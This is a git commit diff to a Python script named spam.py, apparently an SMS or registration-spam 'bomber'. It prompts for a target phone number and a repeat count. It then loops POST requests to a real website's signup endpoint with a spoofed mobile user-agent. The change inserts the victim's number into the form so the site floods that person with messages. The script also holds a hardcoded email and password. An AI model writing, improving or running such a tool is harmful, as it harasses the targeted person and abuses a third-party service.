2a895cf204927557bfbed3846146553909f2e7db
AbilSeno <48641526+AbilSeno@users.noreply.github.com>
2020-09-23 09:13:50 +0700

    Update spam.py

--- spam.py
+++ spam.py
@@ -3,7 +3,7 @@ print (' Script By Abilseno11 ')
 yu = input('Massukkan nomor target (ex:088118) ; ')
 eek = int(input('Massukkan jumlah : '))
 hd  = {'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'}
-dat = {'nama':'Abil+Seno','email_register':'abilseno11%40gmail.com','hp':'08811883541','ulang_tahun':'01%2F01%2F1975','pass':'savagetro123','jns_kelamin':'1'}
+dat = {'nama':'Abil+Seno','email_register':'abilseno11%40gmail.com','hp':yu,'ulang_tahun':'01%2F01%2F1975','pass':'savagetro123','jns_kelamin':'1'}
 for x in range(eek):
  ho = requests.post('https://www.wakuliner.com/main/reg13',headers=hd,data=dat)
  kntl = json.loads(ho.text)
